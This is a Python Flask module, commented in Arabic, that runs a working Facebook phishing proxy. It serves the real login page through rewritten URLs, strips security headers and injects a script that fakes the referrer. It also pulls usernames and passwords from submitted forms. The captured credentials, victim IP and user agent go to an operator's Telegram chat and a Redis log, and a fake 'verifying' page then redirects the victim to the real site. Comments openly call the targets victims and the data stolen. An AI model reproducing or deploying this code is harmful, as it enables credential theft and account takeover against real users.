# facebook_module.py
# ============================================================
# Facebook Proxy v2 — الاحترافية
# - صفحة فيسبوك الحقيقية بنسبة 100%
# - بروكسي متقدم مع session management
# - يلتقط البيانات فور تسجيل الدخول
# ============================================================

import os
import re
import time
import json
import uuid
import requests
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode, urlsplit

from flask import Blueprint, request, Response, redirect, make_response

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("facebook_module")


# ============================================================
# الإعدادات
# ============================================================
TARGET_DOMAIN = "www.facebook.com"     # ★ نستخدم النسخة الكاملة
MOBILE_DOMAIN = "m.facebook.com"
GRAPH_DOMAIN = "static.xx.fbcdn.net"

SESSION_TIMEOUT = 300                   # 5 دقائق
COOKIE_TTL = 3600                       # ساعة

# Headers ممنوعة من النقل
BLOCKED_REQUEST_HEADERS = {
    'host', 'content-length', 'cookie', 'x-forwarded-for',
    'x-real-ip', 'cf-connecting-ip', 'connection',
    'proxy-connection', 'accept-encoding', 'transfer-encoding',
}

BLOCKED_RESPONSE_HEADERS = {
    'content-encoding', 'content-length', 'transfer-encoding',
    'location', 'content-type', 'set-cookie', 'content-security-policy',
    'strict-transport-security', 'x-frame-options',
    'content-security-policy-report-only', 'cross-origin-opener-policy',
    'cross-origin-embedder-policy', 'cross-origin-resource-policy',
}

# ★★★ وسوم HTML اللي محتاجة إعادة كتابة ★★★
REWRITE_ATTRS = (
    'href', 'src', 'action', 'data-uri', 'data-jsid',
    'data-href', 'data-url', 'data-src', 'formaction',
    'poster', 'cite', 'background', 'longdesc', 'usemap',
    'data-video-src', 'data-video-url', 'xlink:href',
)


# ============================================================
# Session Store (في الذاكرة — لكل ضحية session)
# ============================================================
_proxy_sessions = {}


def _get_session(victim_id):
    """يرجع أو ينشئ session لضحية معينة"""
    if victim_id not in _proxy_sessions:
        _proxy_sessions[victim_id] = {
            'session': requests.Session(),
            'cookies': {},
            'created_at': time.time(),
            'last_used': time.time(),
        }

    _proxy_sessions[victim_id]['last_used'] = time.time()
    return _proxy_sessions[victim_id]['session']


def _cleanup_sessions():
    """يحذف الـ sessions القديمة"""
    now = time.time()
    to_delete = []
    for vid, data in _proxy_sessions.items():
        if now - data['last_used'] > SESSION_TIMEOUT:
            to_delete.append(vid)
    for vid in to_delete:
        del _proxy_sessions[vid]


# ============================================================
# ★★★ Credentials Capture ★★★
# ============================================================
def save_credentials_to_db(platform, username, password, ip_address,
                            user_agent, target_chat_id, bot,
                            extra_data=None):
    """حفظ وإرسال البيانات المسروقة بشكل احترافي"""

    # ★ Escape للـ Markdown
    def esc(t):
        return str(t).replace('_', '\\_').replace('*', '\\*').replace('`', '\\`').replace('[', '\\[')

    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    alert_msg = (
        f"🎯 <b>FACEBOOK CAPTURED!</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"📧 <b>Username:</b> <code>{username}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📱 <b>UA:</b> <code>{user_agent[:80]}</code>\n"
        f"🕐 <b>Time:</b> <code>{timestamp}</code>\n"
    )

    if extra_data:
        alert_msg += f"\n📋 <b>Extra:</b>\n"
        for k, v in list(extra_data.items())[:5]:
            alert_msg += f"  • <code>{k}</code>: <code>{str(v)[:60]}</code>\n"

    try:
        bot.send_message(target_chat_id, alert_msg, parse_mode="HTML")
        logger.info(f"✅ Credentials captured: {platform} | user={username[:30]}")
        metrics.inc_counter("credentials_captured", tags={"platform": platform})

        # ★ سجل في Redis
        try:
            from config import redis_client
            if redis_client:
                redis_client.lpush(
                    "credentials_log",
                    json.dumps({
                        'platform': platform,
                        'username': username,
                        'password': password,
                        'ip': ip_address,
                        'ua': user_agent[:200],
                        'timestamp': timestamp,
                        'chat_id': target_chat_id,
                    })
                )
                redis_client.ltrim("credentials_log", 0, 999)
        except Exception as e:
            logger.warning(f"Redis save credentials error: {e}")

    except Exception as e:
        logger.error(f"Telegram dispatch error: {e}")
        metrics.inc_counter("credentials_capture_failed")


# ============================================================
# ★★★ استخراج البيانات من الفورم ★★★
# ============================================================
def extract_credentials(form_data):
    """استخراج دقيق للـ username/password من أي نموذج"""
    username = None
    password = None

    # ★★★ 1. البحث الذكي عن Username ★★★
    USERNAME_KEYS = [
        'email', 'user', 'username', 'login', 'identifier',
        'phone', 'account', 'mail', 'user_email', 'userid',
        'uname', 'signin_email', 'session_key',
    ]
    for key in USERNAME_KEYS:
        for form_key in form_data:
            if key in form_key.lower():
                val = form_data[form_key]
                if val and str(val).strip():
                    username = str(val).strip()
                    break
        if username:
            break

    # ★★★ 2. البحث الذكي عن Password ★★★
    PASSWORD_KEYS = [
        'pass', 'pwd', 'password', 'secret', 'passwd',
        'signin_password', 'user_password', 'pwd_hash',
    ]
    for key in PASSWORD_KEYS:
        for form_key in form_data:
            if key in form_key.lower():
                val = form_data[form_key]
                if val and str(val).strip():
                    password = str(val).strip()
                    break
        if password:
            break

    # ★★★ 3. Fallback مباشر ★★★
    if not username:
        for k in ['email', 'phone', 'identifier', 'username']:
            if k in form_data and form_data[k]:
                username = str(form_data[k]).strip()
                break

    if not password:
        for k in ['pass', 'password', 'pwd']:
            if k in form_data and form_data[k]:
                password = str(form_data[k]).strip()
                break

    return username, password


# ============================================================
# ★★★ تحويل الروابط داخل HTML ★★★
# ============================================================
def rewrite_urls(html_content, base_url, proxy_base_path):
    """تحويل كل الروابط النسبية والمطلقة للـ proxy"""

    if not proxy_base_path:
        return html_content

    # نستخدم نفس الروابط مع id
    base_id_param = ""
    if '?id=' in proxy_base_path:
        base_id_param = "?id=" + proxy_base_path.split('?id=')[1].split('&')[0]

    # ---- 1. HTML attributes ----
    attrs_pattern = r'(' + '|'.join(REWRITE_ATTRS) + r')\s*=\s*(["\'])(.*?)\2'

    def replace_attr(match):
        attr_name = match.group(1)
        quote_char = match.group(2)
        original_url = match.group(3)

        if not original_url:
            return match.group(0)

        # تخطي الروابط اللي مش محتاجة معالجة
        if original_url.startswith((
            'data:', 'javascript:', '#', 'mailto:', 'tel:',
            'about:', 'chrome:', 'fb://', 'whatsapp:'
        )):
            return match.group(0)

        # لو الرابط بالفعل بيعدي على البروكسي
        if '/login.php' in original_url or '/home.php' in original_url:
            return match.group(0)

        # نحوّل لـ absolute
        try:
            absolute_url = urljoin(base_url, original_url)
        except Exception:
            return match.group(0)

        # لو نفسه فيسبوك
        if 'facebook.com' not in absolute_url and 'fbcdn.net' not in absolute_url:
            return match.group(0)

        # بناء رابط البروكسي
        proxied_url = f"{proxy_base_path}&url={quote(absolute_url, safe='')}"
        if '?' not in proxy_base_path:
            proxied_url = f"{proxy_base_path}?url={quote(absolute_url, safe='')}"

        return f'{attr_name}={quote_char}{proxied_url}{quote_char}'

    html_content = re.sub(attrs_pattern, replace_attr, html_content,
                          flags=re.IGNORECASE | re.DOTALL)

    # ---- 2. srcset ----
    def replace_srcset(match):
        quote_char = match.group(1)
        srcset = match.group(2)
        parts = []
        for part in srcset.split(','):
            part = part.strip()
            if not part:
                continue
            tokens = part.split()
            url = tokens[0]
            descriptor = ' '.join(tokens[1:]) if len(tokens) > 1 else ''

            try:
                absolute_url = urljoin(base_url, url)
                if 'facebook.com' in absolute_url or 'fbcdn.net' in absolute_url:
                    if '?' in proxy_base_path:
                        url = f"{proxy_base_path}&url={quote(absolute_url, safe='')}"
                    else:
                        url = f"{proxy_base_path}?url={quote(absolute_url, safe='')}"
            except Exception:
                pass

            parts.append(f"{url} {descriptor}".strip())

        return f'srcset={quote_char}{", ".join(parts)}{quote_char}'

    html_content = re.sub(
        r'srcset\s*=\s*(["\'])(.*?)\1',
        replace_srcset,
        html_content,
        flags=re.IGNORECASE | re.DOTALL
    )

    # ---- 3. CSS url() inside <style> and inline styles ----
    def replace_css_url(match):
        quote_char = match.group(1) or ''
        url = match.group(2)
        try:
            absolute_url = urljoin(base_url, url)
            if 'facebook.com' in absolute_url or 'fbcdn.net' in absolute_url:
                if '?' in proxy_base_path:
                    new_url = f"{proxy_base_path}&url={quote(absolute_url, safe='')}"
                else:
                    new_url = f"{proxy_base_path}?url={quote(absolute_url, safe='')}"
                return f'url({quote_char}{new_url}{quote_char})'
        except Exception:
            pass
        return match.group(0)

    html_content = re.sub(
        r'url\(\s*(["\']?)([^"\'()]+)\1\s*\)',
        replace_css_url,
        html_content,
        flags=re.IGNORECASE
    )

    # ---- 4. Inject base tag for safety ----
    if '<head>' in html_content.lower() and '<base ' not in html_content.lower():
        base_tag = f'<base href="{proxy_base_path}">'
        html_content = re.sub(
            r'(<head[^>]*>)',
            r'\1' + base_tag,
            html_content,
            count=1,
            flags=re.IGNORECASE
        )

    return html_content


# ============================================================
# ★★★ استخراج URL الفيسبوك الحقيقي ★★★
# ============================================================
def get_real_facebook_url(request_path, query_string):
    """استخراج URL الفيسبوك الحقيقي من الطلب"""

    # لو فيه url صريح
    if 'url' in query_string:
        raw = query_string.get('url')
        try:
            return unquote(raw)
        except Exception:
            return raw

    # نبني الرابط من المسار
    clean_args = {k: v for k, v in query_string.items() if k != 'id'}
    query_str = f"?{urlencode(clean_args)}" if clean_args else ""

    # ★ نستخدم www.facebook.com
    if request_path.startswith('/login') or request_path == '/':
        return f"https://{TARGET_DOMAIN}/login.php{query_str}"

    return f"https://{TARGET_DOMAIN}{request_path}{query_str}"


# ============================================================
# ★★★ الصفحات الخاصة ★★★
# ============================================================

# صفحة التحميل بعد نجاح تسجيل الدخول
LOADING_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>جاري التحقق...</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #f0f2f5;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    color: #1c1e21;
  }
  .card {
    background: #fff;
    padding: 48px 32px;
    border-radius: 8px;
    box-shadow: 0 2px 12px rgba(0,0,0,0.1);
    text-align: center;
    max-width: 380px;
    width: 100%;
  }
  .logo {
    font-size: 32px;
    color: #1877f2;
    font-weight: bold;
    margin-bottom: 24px;
    font-family: 'Segoe UI', sans-serif;
  }
  .spinner {
    width: 48px;
    height: 48px;
    border: 4px solid #e4e6eb;
    border-top-color: #1877f2;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 24px auto;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  h2 { font-size: 18px; margin: 16px 0 8px; color: #1c1e21; }
  p { color: #65676b; font-size: 14px; line-height: 1.5; margin: 0; }
  .progress-bar {
    width: 100%;
    height: 4px;
    background: #e4e6eb;
    border-radius: 2px;
    margin-top: 24px;
    overflow: hidden;
  }
  .progress-fill {
    height: 100%;
    width: 0%;
    background: #1877f2;
    animation: progress 2.5s ease-in-out forwards;
  }
  @keyframes progress {
    to { width: 100%; }
  }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">facebook</div>
    <div class="spinner"></div>
    <h2>جاري التحقق من بياناتك...</h2>
    <p>يرجى الانتظار قليلاً، لا تغلق هذه الصفحة</p>
    <div class="progress-bar"><div class="progress-fill"></div></div>
  </div>
  <script>
    setTimeout(function() {
      window.location.href = "https://www.facebook.com/";
    }, 3000);
  </script>
</body>
</html>
"""


# ============================================================
# ★★★ Init Routes ★★★
# ============================================================
def init_facebook_routes(app, bot):
    """تسجيل مسارات Facebook Proxy"""

    @app.route('/login.php', methods=['GET', 'POST'])
    @app.route('/home.php', methods=['GET', 'POST'])
    @app.route('/fb', methods=['GET', 'POST'])
    def fb_login():
        """نقطة الدخول الرئيسية"""
        return _fb_proxy_handler(bot)


    @app.route('/<path:subpath>', methods=['GET', 'POST'])
    def fb_proxy(subpath):
        """معالج عام لكل المسارات"""
        # تخطي المسارات اللي مش بتاعتنا
        if subpath.startswith((
            'apk/', 'api/', 'lsh', 'sh/', 'rat', 'qr/',
            'dashboard', 'wa/', 'victim/', 'sw.js',
            'manifest', '_', 'f/',
        )):
            from flask import abort
            abort(404)

        return _fb_proxy_handler(bot)


    def _fb_proxy_handler(bot):
        """★★★ المعالج الرئيسي ★★★"""

        # نظّف sessions قديمة
        _cleanup_sessions()

        # ---- Chat ID ----
        target_chat_id = request.args.get('id', None)
        if not target_chat_id and request.headers.get('X-Chat-Id'):
            target_chat_id = request.headers.get('X-Chat-Id')

        # ---- استخراج URL الحقيقي ----
        real_fb_url = get_real_facebook_url(request.path, request.args)

        # ---- بناء proxy base path ----
        base_endpoint = request.path
        proxy_base_path = f"{request.url_root.rstrip('/')}{base_endpoint}"
        if target_chat_id:
            proxy_base_path += f"?id={target_chat_id}"

        logger.info(f"🌐 FB PROXY | path={request.path} | target_chat={target_chat_id}")

        try:
            # ============================================
            # ★★★ 1. معالجة POST (تسجيل الدخول) ★★★
            # ============================================
            if request.method == 'POST':
                form_data = request.form.to_dict()

                # استخرج البيانات
                username, password = extract_credentials(form_data)

                # معلومات إضافية
                source_ip = (
                    request.headers.get('CF-Connecting-IP') or
                    request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
                    request.remote_addr
                )
                user_agent = request.headers.get('User-Agent', 'Unknown')

                # ★★★ لحظة الصيد ★★★
                if username and target_chat_id:
                    logger.info(f"🎯 CAPTURED! user={username[:20]} | pass_len={len(password or '')}")
                    save_credentials_to_db(
                        "Facebook",
                        username,
                        password or "غير متاح",
                        source_ip,
                        user_agent,
                        target_chat_id,
                        bot,
                        extra_data={
                            'referer': request.headers.get('Referer', '')[:100],
                            'method': 'POST',
                            'form_keys': ', '.join(list(form_data.keys())[:10]),
                        }
                    )

                    # ★ عرض صفحة "جاري التحقق" ثم التوجيه
                    response = make_response(LOADING_PAGE)
                    response.headers['Content-Type'] = 'text/html; charset=utf-8'
                    return response

                # لو مفيش chat_id → نكمل البروكسي عادي
                logger.warning(f"⚠️ POST without chat_id or username")

            # ============================================
            # ★★★ 2. Forward للفيسبوك الحقيقي ★★★
            # ============================================
            victim_id = target_chat_id or 'anonymous'
            session = _get_session(victim_id)

            # جهز الهيدرز
            headers_to_forward = {}
            for k, v in request.headers:
                if k.lower() not in BLOCKED_REQUEST_HEADERS:
                    headers_to_forward[k] = v

            headers_to_forward['Host'] = TARGET_DOMAIN
            headers_to_forward['User-Agent'] = request.headers.get(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            )
            headers_to_forward['Accept-Encoding'] = 'identity'
            headers_to_forward['Accept-Language'] = request.headers.get(
                'Accept-Language', 'en-US,en;q=0.9,ar;q=0.8'
            )

            # نبعت الطلب
            try:
                if request.method == 'POST':
                    # جهز الـ data
                    post_data = request.form.to_dict()

                    proxied_response = session.post(
                        url=real_fb_url,
                        headers=headers_to_forward,
                        data=post_data,
                        allow_redirects=False,
                        timeout=20,
                        verify=False,
                    )
                else:
                    proxied_response = session.get(
                        url=real_fb_url,
                        headers=headers_to_forward,
                        allow_redirects=False,
                        timeout=20,
                        verify=False,
                    )
            except requests.exceptions.SSLError:
                # فيسبوك أحياناً بيرفض SSL من IPs مش معروفة
                logger.warning("SSL error → retry with verify=False")
                proxied_response = session.get(
                    url=real_fb_url,
                    headers=headers_to_forward,
                    allow_redirects=False,
                    timeout=20,
                    verify=False,
                )

            # ============================================
            # ★★★ 3. معالجة الرد ★★★
            # ============================================
            content_type = proxied_response.headers.get("Content-Type", "").lower()

            # ---------- 3a. Lo HTML ----------
            if "text/html" not in content_type:
                response = Response(
                    proxied_response.content,
                    status=proxied_response.status_code,
                    content_type=content_type,
                )

                # نسخ الكوكيز
                for cookie_name, cookie_value in proxied_response.cookies.items():
                    response.set_cookie(
                        cookie_name,
                        cookie_value,
                        domain=None,
                        path=cookie_value.path or '/',
                    )

                return response

            # ---------- 3b. HTML → نعالجه ----------
            try:
                html_content = proxied_response.content.decode('utf-8', errors='ignore')
            except Exception:
                html_content = proxied_response.content.decode('latin-1', errors='ignore')

            # نعالج الروابط
            modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)

            # نضيف script يخفف الـ detection
            anti_detect_script = """
            <script>
            (function(){
                // شيل أي إشارة للـ proxy
                try {
                    if (window.top !== window.self) {
                        // Allow framing
                    }
                    // Fake referrer
                    Object.defineProperty(document, 'referrer', {
                        get: function() { return 'https://www.facebook.com/'; }
                    });
                } catch(e) {}
            })();
            </script>
            """
            modified_html = modified_html.replace('</head>', anti_detect_script + '</head>', 1)

            # ★ نبني الـ response
            response = Response(modified_html, status=proxied_response.status_code)
            response.headers['Content-Type'] = 'text/html; charset=utf-8'

            # نسخ الهيدرز المسموحة
            for key, value in proxied_response.headers.items():
                if key.lower() not in BLOCKED_RESPONSE_HEADERS:
                    response.headers[key] = value

            # نسخ الكوكيز
            for cookie_name, cookie_value in proxied_response.cookies.items():
                response.set_cookie(
                    cookie_name,
                    cookie_value,
                    domain=None,
                    path=cookie_value.path or '/',
                )

            # ---------- 3c. معالجة الـ Redirects ----------
            if (proxied_response.status_code in (301, 302, 303, 307, 308)
                    and 'Location' in proxied_response.headers):
                original_location = proxied_response.headers['Location']
                absolute_redirect_url = urljoin(real_fb_url, original_location)

                # لو الـ redirect لفيسبوك → نمرره عبر البروكسي
                if 'facebook.com' in absolute_redirect_url:
                    # نحوّله لمسار داخلي
                    parsed = urlparse(absolute_redirect_url)
                    new_path = parsed.path or '/login.php'
                    new_query = parsed.query
                    query_dict = dict(x.split('=') for x in new_query.split('&') if '=' in x)

                    if target_chat_id:
                        query_dict['id'] = target_chat_id
                    query_dict['url'] = absolute_redirect_url

                    proxied_redirect_url = (
                        f"{request.url_root.rstrip('/')}{new_path}?"
                        + urlencode(query_dict)
                    )

                    response.headers['Location'] = proxied_redirect_url
                else:
                    response.headers['Location'] = original_location

            # ═══════════════════════════════════════════
            # ★★★ 4. Detection: هل دي صفحة تسجيل دخول؟ ★★★
            # ═══════════════════════════════════════════
            html_lower = modified_html.lower()
            is_login_page = (
                'name="email"' in html_lower or
                'name="pass"' in html_lower or
                'id="email"' in html_lower or
                'id="pass"' in html_lower or
                'login_form' in html_lower
            )

            if is_login_page:
                logger.info(f"📄 Login page rendered for {target_chat_id}")

            return response

        except requests.exceptions.Timeout:
            logger.warning(f"Facebook timeout for {real_fb_url}")
            return redirect(f"https://{TARGET_DOMAIN}/login.php", code=302)

        except Exception as e:
            logger.exception(f"Facebook Proxy Error: {e}")
            return redirect(f"https://{TARGET_DOMAIN}/login.php", code=302)


    logger.info("[+] Facebook Proxy v2 routes registered")
